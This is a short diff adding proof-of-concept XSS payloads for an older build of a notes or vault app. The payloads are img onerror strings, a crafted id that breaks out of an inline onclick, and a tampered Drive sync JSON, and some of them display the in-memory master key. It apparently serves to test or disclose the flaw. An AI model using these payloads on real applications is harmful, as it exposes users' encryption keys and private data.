@@ -1,0 +1,8 @@
+# Paste ONE of these into Thoughts -> Save (old build). Anything that pops an alert proves script execution.
+<img src=x onerror="alert('XSS')">
+<img src=x onerror="alert('master password = ' + activeKey)">
+# Codex "Name" / Lore title / List title / Journal title are injectable the same way.
+# Break out of the inline onclick used by lists/thoughts via a crafted id (needs write access to the vault file):
+#   id: ');alert(activeKey);//
+# Tampered Drive file (needs Drive write access, NO key needed on the old build, because non-"ENC:" payloads are accepted as-is):
+#   {"payload":"{\"thoughts\":[{\"id\":\"1\",\"type\":\"personal\",\"text\":\"<img src=x onerror=alert(activeKey)>\",\"timestamp\":\"2026-01-01\"}]}"}
